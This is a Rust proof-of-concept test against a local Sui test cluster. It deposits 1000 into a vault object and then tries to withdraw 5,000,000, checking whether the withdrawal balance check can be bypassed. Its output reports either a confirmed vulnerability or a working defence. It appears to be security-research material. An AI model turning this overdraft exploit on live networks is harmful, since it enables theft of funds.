// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Amount Bypass — FINAL v4 (FIXED)

use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use sui_types::base_types::SuiAddress;
use test_cluster::addr_balance_test_env::TestEnvBuilder;

#[tokio::test]
async fn test_object_withdrawal_amount_bypass() {
    println!("\n");
    println!("========================================");
    println!("  PoC: Object Withdrawal Amount Bypass");
    println!("  Deposit: 1000  |  Withdraw: 5,000,000");
    println!("========================================\n");

    // [1] Setup
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg.enable_address_balance_gas_payments_for_testing(); // ← FIX #1: بدون set_
            cfg
        }))
        .build()
        .await;

    println!("[+] Test cluster started");
    println!("[+] enable_object_funds_withdraw = TRUE\n");

    let sender = env.get_sender(0);

    // [2] Publish
    println!("[1] Publishing object_balance package...");
    let gas_pub = env.gas_objects[&sender][0];
    let tx = env
        .tx_builder_with_gas(sender, gas_pub)
        .publish_examples("object_balance")
        .await
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let package_id = effects
        .created()
        .into_iter()
        .find(|(_, owner)| owner.is_immutable())
        .unwrap()
        .0
        .0;
    println!("    Package: {}\n", package_id);

    // [3] Create vault
    println!("[2] Creating vault...");
    let gas_vault = env.gas_objects[&sender][0];
    let tx = env
        .tx_builder_with_gas(sender, gas_vault)
        .move_call(package_id, "object_balance", "new_owned", vec![])
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    let vault_id = effects.created().into_iter().next().unwrap().0 .0;
    println!("    Vault: {}\n", vault_id);

    // [4] Deposit 1000
    println!("[3] Depositing 1000 into vault...");
    let gas_deposit_tx = env.gas_objects[&sender][0];
    let gas_deposit_fund = env.gas_objects[&sender][1];

    let vault_addr: SuiAddress = vault_id.into(); // ← FIX #2: convert ObjectID → SuiAddress

    let tx = env
        .tx_builder_with_gas(sender, gas_deposit_tx)
        .transfer_sui_to_address_balance(
            FundSource::coin(gas_deposit_fund),
            vec![(1000u64, vault_addr)], // ← FIX #2: use converted address
        )
        .build();
    let (_, effects) = env.exec_tx_directly(tx).await.unwrap();
    assert!(effects.status().is_ok(), "Deposit failed: {:?}", effects.status());
    println!("    Deposited 1000 ✓\n");

    // [5] ATTACK
    let attack_amount = 5_000_000u64;
    let gas_attack = env.gas_objects[&sender][0];
    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;

    println!("[4] ATTACK: Withdrawing {} from vault (balance: 1000)...", attack_amount);

    let tx = env
        .tx_builder_with_gas(sender, gas_attack)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    let result = env.exec_tx_directly(tx).await;

    // [6] Analyze
    println!("\n========================================");
    println!("  RESULT");
    println!("========================================\n");

    match result {
        Ok((digest, effects)) => {
            println!("    TX Digest: {}", digest);
            println!("    TX Status: {:?}\n", effects.status());

            if effects.status().is_ok() {
                println!("╔══════════════════════════════════════════════════════════════════╗");
                println!("║  🔴 CRITICAL: VULNERABILITY CONFIRMED!                          ║");
                println!("╚══════════════════════════════════════════════════════════════════╝");
                println!();
                println!("    withdraw_funds_from_object() SUCCEEDED");
                println!("    with amount 5000x the actual balance!");
                println!();
                println!("    Balance:    1,000");
                println!("    Requested:  5,000,000");
                println!("    Ratio:      5000x overdraft");
                println!();
                println!("    PROOF: No balance check in any layer");
                println!("    before settlement.");
                println!();

                if !effects.accumulator_events().is_empty() {
                    println!("    [+] Split event found in effects!");
                }
                panic!("[CRITICAL] Balance check bypassed!");

            } else {
                let status_str = format!("{:?}", effects.status());
                println!("    ✓ Transaction FAILED\n");
                println!("    Status: {}\n", status_str);

                if status_str.contains("InsufficientFunds")
                    || status_str.contains("ENotEnough")
                {
                    println!("╔══════════════════════════════════════════════════════════════════╗");
                    println!("║  🟢 DEFENSE DETECTED — VULNERABILITY LIKELY FIXED               ║");
                    println!("╚══════════════════════════════════════════════════════════════════╝");
                } else {
                    println!("[?] Unexpected error");
                }
            }
        }
        Err(e) => {
            println!("    ✗ Execution error: {:?}", e);
            println!("\n    [?] Test setup issue");
        }
    }
}
